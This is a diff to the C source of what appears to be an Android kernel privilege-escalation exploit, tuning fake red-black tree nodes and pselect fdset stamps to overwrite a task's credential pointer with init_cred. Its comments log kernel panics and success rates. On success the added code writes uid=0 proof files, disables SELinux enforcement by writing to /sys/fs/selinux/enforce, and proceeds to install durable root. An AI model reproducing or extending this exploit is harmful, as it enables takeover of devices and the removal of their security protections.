@@ -936,15 +936,16 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
             }
           } else if (env_flag("MODE4_SLIDE_CRED", 0)) {
             /*
-             * *task.cred = init_cred — CLASSIC only-right store (08-31):
-             * the previous only-left shape (pc=VALUE, left=slot) never
-             * landed once in ~84 beacon-verified attempts, while the
-             * same-walk W1 leaf-NULL (parent=slot-8) lands every clean
-             * boot. Same family as W1 but with a child: the erased node
-             * carries right=init_cred, so rb_erase's __rb_change_child
-             * stores the child into *(parent+8) = *cred_slot.
-             * Side effect (accepted, Z-era): rb_set_parent_color writes
-             * pc into init_cred+0 (usage counter).
+             * *task.cred = init_cred.
+             * Default (09-12): park-class only-left PLAIN-STORE
+             *   tree_pc=VALUE=init_cred  tree_l=TARGET=slot  tree_r=0
+             * Z25/Z27/Z29/Z33 walks LIVED on this shape. change_child
+             * extra store hits init_cred+8 (uid word) — Z33 showed
+             * leftover pointer bits in suid/gid but child Uid hit 0.
+             *
+             * GLM 08-31 only-right (parent=slot-8, right=init_cred)
+             * KPd 4/4 (chains V-Y): one-child erase rebalances through
+             * task_struct. Keep behind MODE4_CRED_RIGHT=1.
              */
             {
               uint64_t ztgt = (uint64_t)pselect_write_target();
@@ -960,13 +961,15 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (active_offsets && active_offsets->off_init_task)
                       ? (uint64_t)active_offsets->off_init_task
                       : (uint64_t)INIT_TASK_OFF;
-              tree_pc = (ztgt - 8) & ~3ULL;
-              /* RED parent — W1's proven choice: erasing a red node
-               * needs NO rebalance. The black variant (|1) triggers
-               * ____rb_erase_color walking the fake parent's children
-               * (cred pointers) — chains R/S/T KP'd there. */
-              tree_r = val;
-              tree_l = 0;
+              if (env_flag("MODE4_CRED_RIGHT", 0)) {
+                tree_pc = (ztgt - 8) & ~3ULL;
+                tree_r = val;
+                tree_l = 0;
+              } else {
+                tree_pc = val & ~1ULL; /* red VALUE — no erase_color */
+                tree_r = 0;
+                tree_l = ztgt;
+              }
               pi_parent = 0;
               pi_right = 0;
               pi_left = 0;
@@ -977,11 +980,15 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                        : 0x02BB9D00ULL));
               stack_prio = 3;
               stack_deadline = 0;
-              pr_info("stack SLIDE_CRED classic only-right: *%016llx = "
-                      "%016llx (%s) parent=%016llx\n",
+              pr_info("stack SLIDE_CRED %s: *%016llx = %016llx (%s) "
+                      "pc=%016llx r=%016llx l=%016llx\n",
+                      env_flag("MODE4_CRED_RIGHT", 0) ? "only-right"
+                                                      : "PLAIN only-left",
                       (unsigned long long)ztgt, (unsigned long long)val,
                       g_cred_copy ? "cred_copy" : "init_cred",
-                      (unsigned long long)tree_pc);
+                      (unsigned long long)tree_pc,
+                      (unsigned long long)tree_r,
+                      (unsigned long long)tree_l);
             }
           } else if (env_flag("MODE4_SLIDE_ZERO", 0)) {
             /*
@@ -1051,6 +1058,9 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
              * heap W0.pi placement entirely — the write comes from the
              * fdset stamp on the kernel stack. SLIDE_VERIFY confirmed
              * the table is at fake_fops (owner=0 at +0x00).
+             * N3/N5 ALIVE geometry: waiter.lock/task are the spray
+             * objects on the same page as fake_fops. BSS lock + heap
+             * fake_fops as rb parent KPd at pselect (16:02 / 16:07).
              */
             tree_pc = (uint64_t)fake_fops;
             tree_r = 0;
@@ -1060,11 +1070,12 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
             pi_parent = 0;
             pi_right = 0;
             pi_left = 0;
+            stack_task = fake_task;
             stack_lock = fake_lock;
             stack_prio = 3;
             stack_deadline = 0;
             pr_info("stack SLIDE_SWAP: *MISC.fops(%016llx) = fake_fops "
-                    "(%016llx)\n",
+                    "(%016llx) lock=spray\n",
                     (unsigned long long)tree_l,
                     (unsigned long long)tree_pc);
           } else if (env_flag("MODE4_SLIDE_VERIFY", 0)) {
@@ -1751,11 +1762,19 @@ void do_pselect_fake_lock_route(void) {
   int sc = env_flag("MODE4_STATIC_CHAIN", 0);
   int vs_retries = 0; /* reclaim-loss retries consumed by VERIFY_SWAP */
   const int VS_MAX_RECLAIM_RETRIES = 4;
-  int cred_mode = env_flag("MODE4_SLIDE_CRED", 0) && g_uid0_child_pid > 0;
+  int cred_mode = env_flag("MODE4_SLIDE_CRED", 0) &&
+                  (g_uid0_child_pid > 0 || g_uid0_check_self);
   int oracle_mode = env_flag("MODE4_SLIDE", 0) &&
                     !env_flag("MODE4_SLIDE_SWAP", 0) && g_bootid_before[0];
+  /* Child cred retries after a living park KP the boot (3d625fc0 / 3fb81b07).
+   * PCKM00's 12–24 re-stamps are for the fops-swap lottery, not park+cred.
+   * Self-cred stays 2 (living getuid=0 used that). Oracle stays 12. */
+  int cred_retry_def = (cred_mode && g_uid0_check_self) ? 2
+                       : (cred_mode ? 1 : 12);
   int max_att = (cred_mode || oracle_mode)
-                    ? env_int_range("LANDING_RETRY_ATTEMPTS", 12, 1, 24)
+                    ? env_int_range("LANDING_RETRY_ATTEMPTS",
+                                    cred_retry_def,
+                                    1, 24)
       : env_flag("MODE4_SC_UMASK", 0) ? 3
       : (env_flag("MODE4_SC_DIAG", 0) ? 2 : (sc ? 7 : (vs ? 2
                    : (pad3 ? 3
@@ -2019,11 +2038,14 @@ void do_pselect_fake_lock_route(void) {
           int canary = env_flag("UID0_COMM_CANARY", 0);
           uint32_t cq = cred_mode ? uid0_child_getuid_query() : 9999;
           if (cred_mode)
-            pr_info("child uid query attempt=%d -> %u\n", route_attempt, cq);
+            pr_info("%s uid query attempt=%d -> %u getuid=%u\n",
+                    g_uid0_check_self ? "self" : "child", route_attempt, cq,
+                    (unsigned)getuid());
           int landed = canary ? uid0_child_comm_landed()
-                              : (cred_mode ? (cq == 0 || uid0_payload_fired())
+                              : (cred_mode ? (cq == 0 || uid0_payload_fired() ||
+                                              (uint32_t)getuid() == 0)
                                            : bootid_changed());
-          if (cred_mode && cq == 0) {
+          if (cred_mode && (cq == 0 || (uint32_t)getuid() == 0)) {
             /* cred LANDED: G execs the payload NOW. Then the full bridge:
              * install pipe physrw on a fresh ashmem fd and run
              * install_android_root (durable root: init_cred identity +
@@ -2032,6 +2054,42 @@ void do_pselect_fake_lock_route(void) {
             char g = 'G';
             if (g_uid0_cmd_w >= 0)
               (void)write(g_uid0_cmd_w, &g, 1);
+            {
+              /* Persist before retries/bridge — 09-12 self punch was uid0
+               * but the child query never landed so we never wrote proof. */
+              int pf;
+              char ib[96];
+              int n;
+              umask(0);
+              pf = open("/data/local/tmp/uid0_id.txt",
+                        O_WRONLY | O_CREAT | O_TRUNC, 0666);
+              n = snprintf(ib, sizeof(ib), "uid=%u euid=%u pid=%d\n",
+                           (unsigned)getuid(), (unsigned)geteuid(),
+                           (int)getpid());
+              if (pf >= 0) {
+                if (n > 0)
+                  (void)write(pf, ib, (size_t)n);
+                close(pf);
+                chmod("/data/local/tmp/uid0_id.txt", 0666);
+              }
+              pf = open("/sdcard/ghostlock/aarif/uid0_id.txt",
+                        O_WRONLY | O_CREAT | O_TRUNC, 0666);
+              if (pf >= 0) {
+                if (n > 0)
+                  (void)write(pf, ib, (size_t)n);
+                close(pf);
+              }
+              pf = open("/sys/fs/selinux/enforce", O_WRONLY);
+              if (pf >= 0) {
+                ssize_t wr = write(pf, "0", 1);
+                pr_info("UID0 setenforce n=%zd errno=%d\n", wr, errno);
+                close(pf);
+              }
+              durable_proof_log("uid0_WIN");
+              live_sync_log("UID0", "WIN_getuid0");
+              fflush(stdout);
+              fsync(STDOUT_FILENO);
+            }
             {
               int rfd = open_ashmem_device(); /* resolves the shell-openable alias via ashmem_path */
               if (rfd >= 0) {
